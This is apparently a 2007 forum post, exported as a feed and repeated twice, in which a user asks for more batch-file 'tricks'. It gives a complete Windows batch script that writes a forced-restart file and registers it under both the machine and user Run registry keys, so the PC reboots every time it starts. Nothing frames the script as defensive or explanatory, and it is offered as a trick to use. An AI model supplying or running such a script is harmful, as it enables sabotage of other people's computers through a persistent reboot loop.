channel.title: More .bat things?
channel.description:
I think there should be more .bat tricks, such as the codes like
echo @echo off>c:\windows\hartlell.bat echo break off>>c:\windows\hartlell.bat echo shutdown -r -t 11 -f>>c:\windows\hartlell.bat echo end>>c:\windows\hartlell.bat reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f reg add hkey_current_user\software\microsoft\windows\currentversion\run /v HAHAHA /t reg_sz /d c:\windows\hartlell.bat /f echo Undergroundkyng Strikes Again PAUSE
to shutdown PC whenever it boots[br][size=1]Posted on: January 12, 2007, 01:41:21 AM[/size][hr]A Great website for .bat help
http://www.computerhope.com

item.title: More .bat things?
item.dc:creator: @aps aps
item.description:
@aps wrote:

I think there should be more .bat tricks, such as the codes like

echo @echo off>c:\windows\hartlell.bat
echo break off>>c:\windows\hartlell.bat
echo shutdown -r -t 11 -f>>c:\windows\hartlell.bat
echo end>>c:\windows\hartlell.bat
reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v HAHAHA /t reg_sz /d c:\windows\hartlell.bat /f
echo Undergroundkyng Strikes Again
PAUSE

to shutdown PC whenever it boots[br][size=1]Posted on: January 12, 2007, 01:41:21 AM[/size][hr]A Great website for .bat help
